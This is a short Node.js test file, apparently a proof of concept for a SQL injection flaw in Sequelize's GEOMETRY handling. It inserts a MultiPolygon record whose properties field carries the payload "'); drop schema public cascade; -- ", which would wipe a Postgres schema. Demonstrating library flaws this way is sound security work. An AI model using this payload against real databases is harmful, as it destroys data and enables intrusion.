const { equal } = require("node:assert");
const { createServer } = require("node:http");
const { test } = require("node:test");
const { setTimeout } = require("node:timers/promises");

test("Vulnerable to SQL Injection", async () => {
  const Sequelize = require("sequelize");

  const sequelize = new Sequelize("postgres://test:test@172.17.0.1:5433/test", {
    dialectOptions: {
      multipleStatements: true,
    },
  });

  const Cities = sequelize.define("Cities", {
    name: Sequelize.STRING,
    location: Sequelize.GEOMETRY("MultiPolygon"),
  });

  const server = createServer();
  server.listen(3000);

  await sequelize.sync();

  await sequelize.sync();
  Cities.insertOrUpdate({
    name: "test",
    location: {
      type: "MultiPolygon",
      properties: {
        exploit: "'); drop schema public cascade; -- ",
      },
      coordinates: [],
    },
  });

  await sequelize.close();
  server.close();
});
